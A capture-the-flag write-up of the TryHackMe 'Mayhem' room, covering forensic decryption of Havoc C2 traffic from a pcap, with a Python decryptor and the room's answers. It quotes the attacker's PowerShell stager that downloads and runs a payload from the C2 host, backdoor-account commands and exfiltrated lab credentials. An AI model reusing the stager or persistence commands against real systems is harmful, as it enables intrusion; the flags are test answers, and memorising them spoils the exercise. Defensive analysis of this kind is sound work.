# TryHackMe — Mayhem Room (Complete Technical Write-Up)

- **Room**: Mayhem Room (Havoc C2 Network Forensics)
- **Category**: DFIR / Network Forensics (`.pcapng`) & C2 Traffic Decryption (Havoc Framework)
- **Artifacts in Repo**:
  - [`evidence-1700022726858.zip`](./evidence-1700022726858.zip) (`124,777` bytes)
  - [`traffic.pcapng`](./traffic.pcapng) (`305,324` bytes, 636 packets)
  - [`solve.py`](./solve.py) (Standalone Python PCAPNG TCP stream reassembler & Havoc AES-256-CTR decryptor)

---

## 1. Initial Triage & PCAP Overview

First, we inspected the packet capture (`traffic.pcapng`) to analyze the protocol hierarchy and IPv4 conversations using `tshark`:

### Command Executed
```bash
unzip -l evidence-1700022726858.zip \
  && unzip -o evidence-1700022726858.zip \
  && tshark -r traffic.pcapng -q -z io,phs \
  && tshark -r traffic.pcapng -q -z conv,ip
```

### Output
```text
Archive:  evidence-1700022726858.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   305324  2023-11-14 23:24   traffic.pcapng
---------                     -------
   305324                     1 file

===================================================================
Protocol Hierarchy Statistics
Filter: 

frame                                    frames:636 bytes:283571
  eth                                    frames:636 bytes:283571
    ip                                   frames:628 bytes:283163
      tcp                                frames:628 bytes:283163
        http                             frames:182 bytes:37358
          data                           frames:88 bytes:17320
          media                          frames:90 bytes:19287
          data-text-lines                frames:1 bytes:174
    arp                                  frames:8 bytes:408
===================================================================
================================================================================
IPv4 Conversations
Filter:<No Filter>
                                               |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
                                               | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
10.0.2.38            <-> 10.0.2.37                328 230 kB        292 52 kB         620 282 kB        1.775045000       181.2444
10.0.2.38            <-> 104.26.10.240              2 120 bytes       2 108 bytes       4 228 bytes     0.000000000         0.0151
10.0.2.38            <-> 192.229.211.108            2 120 bytes       2 108 bytes       4 228 bytes     0.244939000         0.0155
================================================================================
```

- **Victim Host**: `10.0.2.38` (`WIN-9H86M71MBE9` / `clientserver.thm`)
- **Attacker / C2 Host**: `10.0.2.37`

---

## 2. Step 1 — Inspecting Initial Stager & Identifying Havoc C2

Next, we inspected the HTTP requests and responses in `traffic.pcapng`:

### Command Executed
```bash
tshark -r traffic.pcapng -Y 'http' -T fields \
  -e frame.number -e ip.src -e ip.dst \
  -e http.request.method -e http.request.full_uri \
  -e http.response.code -e http.file_data | head -n 10
```

### Output (Abbreviated)
```text
12  10.0.2.38  10.0.2.37  GET   http://10.0.2.37:1337/install.ps1
15  10.0.2.37  10.0.2.38        http://10.0.2.37:1337/install.ps1  200  24617973585338486c6866203d2022687474703a2f2f31302e302e322e33373a313333372f6e6f74657061642e65786522...
22  10.0.2.38  10.0.2.37  GET   http://10.0.2.37:1337/notepad.exe
92  10.0.2.37  10.0.2.38        http://10.0.2.37:1337/notepad.exe  200  4d5a900003000000...
100 10.0.2.38  10.0.2.37  GET   http://10.0.2.37:1337/notepad.exe
174 10.0.2.37  10.0.2.38        http://10.0.2.37:1337/notepad.exe  200  4d5a900003000000...
182 10.0.2.38  10.0.2.37  POST  http://10.0.2.37/                       00000113deadbeef0e9fb7d80000006300000000946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca8cd00c3e349290565aaa5a8c3aacd430...
```

Decoding the hex payload of Frame 15 (`install.ps1`) gives:
```powershell
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
$65lmAtnzW8 = New-Object System.Net.WebClient;
$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
Start-Process -Filepath $LA4rJgSPpx
```

Once `C:\Users\paco\Downloads\notepad.exe` starts, it sends HTTP `POST` requests to `http://10.0.2.37/` beginning at **Frame 182**.

### Havoc Demon Registration Packet (`Frame 182`)
Inspecting the 20-byte header at the start of Frame 182's HTTP POST body:
```text
00000113  deadbeef  0e9fb7d8  00000063  00000000
^^^^^^^^  ^^^^^^^^  ^^^^^^^^  ^^^^^^^^  ^^^^^^^^
Payload   Magic     Agent ID  Command   Request ID
Size      Bytes               (0x63=99
(275 B)   (Havoc)             DEMON_INIT)
```

In the **Havoc C2 Framework**, the `DEMON_INIT` (`99` / `0x63`) packet immediately follows the 20-byte header with the plaintext **32-byte AES-256 Key** and **16-byte AES-128 IV** (used in **AES-256-CTR** mode for the rest of the registration metadata and all subsequent C2 packets):
- **AES-256 Key** (bytes `20..52`):
  `946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca`
- **AES-128 IV / Counter** (bytes `52..68`):
  `8cd00c3e349290565aaa5a8c3aacd430`
- **Encrypted Host Metadata** (bytes `68..`): AES-256-CTR ciphertext.

For all subsequent packets:
- **Agent -> C2 (`POST` from `10.0.2.38`)**: 20-byte plaintext header (`[Size][deadbeef][AgentID][CommandID][RequestID]`) followed by AES-256-CTR ciphertext starting at byte offset `20`.
- **C2 -> Agent (`200 OK` from `10.0.2.37`)**: 12-byte plaintext header (`[CommandID][RequestID][PayloadSize]`) followed by AES-256-CTR ciphertext starting at byte offset `12`.

---

## 3. Step 2 — Decrypting the Full Havoc C2 Session

We ran the following Python script using `tshark` and `cryptography` to decrypt every C2 task (`10.0.2.37 -> 10.0.2.38`) and agent output (`10.0.2.38 -> 10.0.2.37`):

### Command & Code Executed
```bash
python3 - << 'EOF'
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

key = bytes.fromhex('946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca')
iv = bytes.fromhex('8cd00c3e349290565aaa5a8c3aacd430')

def decrypt(ct):
    cipher = Cipher(algorithms.AES(key), modes.CTR(iv))
    decryptor = cipher.decryptor()
    return decryptor.update(ct) + decryptor.finalize()

cmd = [
    'tshark', '-r', 'traffic.pcapng',
    '-Y', 'http && frame.number >= 182',
    '-T', 'fields', '-e', 'frame.number', '-e', 'ip.src', '-e', 'http.file_data'
]
out = subprocess.check_output(cmd).decode()
for line in out.strip().splitlines():
    parts = line.split('\t')
    if len(parts) < 3 or not parts[2]:
        continue
    fnum, src, hexdata = parts[0], parts[1], parts[2]
    data = bytes.fromhex(hexdata)
    if len(data) <= 20:
        continue
    if src == '10.0.2.38':
        ct = data[20+48:] if fnum == '182' else data[20:]
        pt = decrypt(ct)
        print(f'=== Frame {fnum} (Agent -> C2, {len(pt)} bytes) ===')
        print(''.join(chr(b) if 32 <= b < 127 or b in (10, 13, 9) else '' for b in pt))
    else:
        ct = data[12:]
        pt = decrypt(ct)
        print(f'=== Frame {fnum} (C2 -> Agent, {len(pt)} bytes) ===')
        print(''.join(chr(b) if 32 <= b < 127 or b in (10, 13, 9) else '' for b in pt))
EOF
```

---

## 4. Decrypted C2 Timeline & Question Answers

### Question 1: What is the compromised SID?
- **Frame 182 (Agent -> C2 Registration Metadata)**:
  Identifies host `WIN-9H86M71MBE9`, user `paco`, domain `clientserver.thm`, IP `10.0.2.38`, and process `C:\Users\paco\Downloads\notepad.exe`.
- **Frame 236 (C2 -> Agent) & Frame 239 (Agent -> C2)**:
  The C2 server sends an inline COFF/BOF object (`whoami` BOF) in Frame 236, and the agent returns the full `whoami /all` output in Frame 239:
  ```text
  UserName              SID
  ====================== ====================================
  CLIENTSERVER\paco     S-1-5-21-679395392-3966376528-1349639417-1103
  ```
- **Answer**: `S-1-5-21-679395392-3966376528-1349639417-1103`

---

### Question 2: What is the Link-local IPv6 Address of the server?
- **Frame 266 (C2 -> Agent)**:
  ```text
  c:\windows\system32\cmd.exe /c ipconfig
  ```
- **Frame 274 (Agent -> C2)**:
  ```text
  Windows IP Configuration

  Ethernet adapter Ethernet:

     Connection-specific DNS Suffix  . : home
     Link-local IPv6 Address . . . . . : fe80::e134:1b0c:c8d5:3020%6
     IPv4 Address. . . . . . . . . . . : 10.0.2.38
     Subnet Mask . . . . . . . . . . . : 255.255.255.0
     Default Gateway . . . . . . . . . : 10.0.2.1
  ```
  *(Also confirmed in Frame 314 `systeminfo` output as `fe80::e134:1b0c:c8d5:3020`.)*
- **Answer**: `fe80::e134:1b0c:c8d5:3020%6` (or `fe80::e134:1b0c:c8d5:3020`)

---

### Question 3: Somebody printed a flag for us to see. What is that flag?
- **Frame 333 (C2 -> Agent)**:
  ```text
  c:\windows\system32\cmd.exe /c echo THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}
  ```
- **Frame 341 (Agent -> C2)**:
  ```text
  THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}
  ```
- **Answer**: `THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}`

---

### Question 4: A new account to keep the connection was added. What is the username and password of that account? (`username:password`)
- **Frame 378 (C2 -> Agent)**:
  ```text
  c:\windows\system32\cmd.exe /c net user administrato WfD3hz3AXZ4n /add
  ```
- **Frame 386 (Agent -> C2)**:
  ```text
  The command completed successfully.
  ```
- **Frame 470 (C2 -> Agent)**:
  ```text
  c:\windows\system32\cmd.exe /c net localgroup administrators administrato /add
  ```
- **Frame 478 (Agent -> C2)**:
  ```text
  The command completed successfully.
  ```
- **Answer**: `administrato:WfD3hz3AXZ4n`

---

### Question 5: An important file on the server containing the other THM flag. What is the full path of that file?
- **Frame 542 & 572 (C2 -> Agent)**:
  ```text
  c:\windows\system32\cmd.exe /c dir C:\Users\paco\Desktop\
  c:\windows\system32\cmd.exe /c dir C:\Users\paco\Desktop\Files\
  ```
- **Frame 602 (C2 -> Agent)**:
  ```text
  c:\windows\system32\cmd.exe /c type C:\Users\paco\Desktop\Files\clients.csv
  ```
- **Frame 610 (Agent -> C2)**:
  ```csv
  username,password,email
  jchristophle0,gH5#g..mL,acox0@clientserver.thm
  arother1,fT4&tf>i'c%4%,efishenden1@clientserver.thm
  mstitcher2,mB8#jDp*O$Tv}?,ograal2@clientserver.thm
  smcbayne3,cV3&uD9w.,rdeeble3@clientserver.thm
  afearby4,zO8.dugy9dq,mhartridge4@clientserver.thm
  jrowley5,"mE8#uZV48nU&Mc,5",wcumes5@clientserver.thm
  fbillitteri6,"kX7`\@4#+{a5,",asnalham6@clientserver.thm
  jpowers7,kK2/ix%2i8U6L$A,awarrack7@clientserver.thm
  cpattinson8,wX4\ZmomV78GBRa+,kstickels8@clientserver.thm
  wrait9,THM{I_Can_SEE_ThE_fiL3_YoU_ToOk},fgoodall9@clientserver.thm
  ```
- **Answer (Full Path)**: `C:\Users\paco\Desktop\Files\clients.csv`
- **Answer (Second Flag)**: `THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}`

---

## 5. Automated Solver (`solve.py`)

Running [`solve.py`](./solve.py) reproduces the entire analysis directly from `evidence-1700022726858.zip`:

```bash
python3 solve.py
```

```text
========================================================================
TryHackMe - Mayhem Room (Havoc C2 DFIR Analysis)
========================================================================
[+] Initial Stager (install.ps1):
    $aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx

[+] Havoc Demon Agent ID    : 0e9fb7d8
[+] Havoc Demon AES-256 Key : 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
[+] Havoc Demon AES-128 IV  : 8cd00c3e349290565aaa5a8c3aacd430

------------------------------------------------------------------------
Q1. Compromised SID         : S-1-5-21-679395392-3966376528-1349639417-1103
Q2. Link-local IPv6 Address : fe80::e134:1b0c:c8d5:3020%6
Q3. Printed Flag            : THM{HavOc_C2_DeCRypTing_is_Fun_Fun_FUN}
Q4. Persistence Account     : administrato:WfD3hz3AXZ4n
Q5. Exfiltrated File Path   : C:\Users\paco\Desktop\Files\clients.csv
    Exfiltrated File Flag   : THM{I_Can_SEE_ThE_fiL3_YoU_ToOk}
========================================================================
```
